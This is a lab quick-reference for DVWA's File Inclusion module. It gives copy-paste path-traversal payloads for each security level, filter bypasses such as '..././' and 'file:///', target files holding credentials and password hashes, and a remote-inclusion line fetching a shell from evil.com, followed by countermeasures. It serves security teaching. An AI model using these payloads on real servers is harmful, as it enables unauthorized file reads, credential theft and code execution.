# File Inclusion Practice — Quick Reference

> DVWA Module: **File Inclusion**
> Book Reference: Chapter 4.10.1 (Directory Traversal), also relates to Chapter 4.13 (File Include Attacks)

---

## DVWA URL Path

```
http://localhost:4280/vulnerabilities/fi/?page=
```

---

## Copy-Paste Payloads by Level

### Low Level — No filtering

```
../../../../../../etc/passwd
../../../../../../etc/shadow
../../../../../../etc/hosts
../../../../../../proc/version
../../../../../../var/www/html/config/config.inc.php
../../../../../../var/log/apache2/access.log
http://evil.com/shell.txt
```

### Medium Level — Strips `../` and `..\` once

```
..././..././..././..././..././..././etc/passwd
..././..././..././..././..././..././var/www/html/config/config.inc.php
/etc/passwd
/etc/hosts
/proc/version
```

### High Level — Requires filename to start with "file"

```
file:///etc/passwd
file:///etc/hosts
file:///proc/version
file:///var/www/html/config/config.inc.php
file/../../../etc/passwd
```

### Impossible Level — Whitelist only

```
include.php
file1.php
file2.php
file3.php
```

Nothing else works.

---

## Interesting Files to Read on the Server

| File | What It Contains |
|---|---|
| `/etc/passwd` | User accounts, home directories, shells |
| `/etc/hosts` | Hostname mappings — reveals internal network info |
| `/proc/version` | Linux kernel version — useful for finding kernel exploits |
| `/var/www/html/config/config.inc.php` | DVWA database credentials (username, password, host) |
| `/var/log/apache2/access.log` | Apache access log — can be used for log poisoning attacks |
| `/etc/shadow` | Password hashes — usually not readable by web server user |
| `/proc/self/environ` | Environment variables of the current process |

---

## Security Level Comparison

| Aspect | Low | Medium | High | Impossible |
|---|---|---|---|---|
| Filter type | None | Blacklist (`../`, `..\`) | Prefix check (`file`) | Whitelist |
| `../` traversal | Works | Blocked (bypassable) | Blocked | Blocked |
| Nested `..././` | Works | Works | Blocked | Blocked |
| Absolute path `/etc/passwd` | Works | Works | Blocked | Blocked |
| `file:///etc/passwd` | Works | Works | Works | Blocked |
| RFI (remote URL) | Works* | Blocked (strips `http://`) | Blocked | Blocked |
| Secure | No | No | No | Yes |

\* Requires `allow_url_include = On` in PHP config.

---

## LFI vs RFI Comparison

| | Local File Inclusion (LFI) | Remote File Inclusion (RFI) |
|---|---|---|
| What it does | Reads/executes files already on the server | Fetches and executes files from an external server |
| Payload example | `?page=../../etc/passwd` | `?page=http://evil.com/shell.txt` |
| PHP setting required | None (default behavior) | `allow_url_include = On` |
| Severity | High — reads configs, logs, source code | Critical — arbitrary code execution |
| Common in practice | Very common | Rare (setting is off by default since PHP 5.2) |
| Book chapter | 4.10 (Directory Traversal) | 4.13 (File Include Attacks) |

---

## Book's Countermeasure Summary

1. **Whitelist allowed filenames** — The primary defense. Maintain an explicit list of files that may be included. Reject everything else.

2. **Use an indirect mapping** — Instead of passing filenames in the URL, pass an ID or key that maps to a filename internally:
   ```
   ?page=1  -->  internally maps to file1.php
   ?page=2  -->  internally maps to file2.php
   ```

3. **Restrict filenames to alphanumeric characters** — If you must accept a filename, reject any input containing `/`, `\`, `.`, `%`, or null bytes.

4. **Disable `allow_url_include`** — Prevents RFI entirely. This is off by default in modern PHP.

5. **Use `basename()` to strip directory components** — As a secondary defense, `basename("../../etc/passwd")` returns just `passwd`, preventing traversal.

6. **Set `open_basedir`** — PHP's `open_basedir` directive restricts file access to specified directories, limiting what can be read even if traversal succeeds.

---

## Common Mistakes

| Mistake | Why It Fails |
|---|---|
| Stripping `../` once | Nested sequences like `..././` reconstruct after stripping |
| Checking only the prefix | `file:///etc/passwd` starts with "file" but reads arbitrary files |
| Blocking only relative paths | Absolute paths (`/etc/passwd`) bypass relative-path filters |
| Relying on file extensions | Null byte (`%00`) can truncate the extension in older PHP versions |
| Using blacklists instead of whitelists | Attackers always find new encodings and bypass techniques |
| Trusting `allow_url_include = Off` alone | LFI still works and is still dangerous without RFI |
